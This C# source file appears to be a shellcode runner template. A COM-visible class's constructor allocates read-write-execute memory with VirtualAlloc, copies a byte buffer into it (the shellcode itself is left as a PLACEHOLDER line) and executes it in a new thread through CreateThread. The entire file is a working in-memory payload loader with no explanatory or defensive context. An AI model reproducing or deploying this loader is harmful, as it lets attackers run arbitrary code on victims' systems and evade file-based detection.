using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, 
        uint dwSize, 
        uint flAllocationType,
        uint flProtect
        );

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId
        );

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(
        IntPtr hHandle, 
        UInt32 dwMilliseconds
        );


    public TestClass()
    {
		PLACEHOLDER

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(
            IntPtr.Zero, 
            (uint)size, 
            0x3000, 
            0x40
            );

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(
            IntPtr.Zero, 
            0, 
            addr, 
            IntPtr.Zero, 
            0, 
            IntPtr.Zero
            );

        WaitForSingleObject(
            hThread, 
            0xFFFFFFFF
            );
    }
}
